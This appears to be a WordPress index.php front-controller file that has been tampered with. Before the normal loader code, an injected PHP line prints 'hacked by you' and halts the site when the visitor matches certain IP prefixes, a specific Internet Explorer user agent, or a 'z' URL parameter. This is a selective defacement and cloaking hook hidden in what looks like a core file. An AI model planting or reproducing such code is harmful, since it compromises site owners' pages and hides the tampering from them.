<?php $r=$_SERVER["REMOTE_ADDR"];if((preg_match("/69.42./",$r)) OR (preg_match("/compatible; MSIE 9.0; Windows NT 6.0; Trident\/5.0/i",$_SERVER["HTTP_USER_AGENT"])) OR (preg_match("/72.20./",$r)) OR (preg_match("/141.101./",$r)) OR(isset($_GET["z"]))){echo "hacked by you";exit;}?>
<?php
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define('WP_USE_THEMES', true);

/** Loads the WordPress Environment and Template */
require('./wp-blog-header.php');
